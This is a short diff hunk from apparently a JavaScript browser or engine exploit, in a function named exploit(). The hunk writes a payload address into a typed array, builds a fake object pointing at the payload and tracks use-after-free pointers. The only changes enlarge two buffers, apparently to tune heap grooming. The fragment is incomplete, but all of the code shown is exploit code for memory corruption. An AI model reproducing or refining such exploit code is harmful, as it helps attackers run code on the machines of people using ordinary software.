@@ -108,13 +108,13 @@ function exploit() {
     view[index * 4 + 3] = ((payloadAddress + offset) >> 24) & 0xFF;
   }
   // Create fake object structure
-  const fakeObject = new Uint32Array(1000);
+  const fakeObject = new Uint32Array(8000);
   fakeObject[0] = payloadAddress;
   fakeObject[1] = payloadAddress + offset;
   
   // UAF pointer tracking
   const uaf_ptr_list = [];
-  const sharedObjPtr = new ArrayBuffer(102400);
+  const sharedObjPtr = new ArrayBuffer(819200);
   
   if (!uaf_ptr_list.includes(sharedObjPtr)) {
     uaf_ptr_list.push(sharedObjPtr);
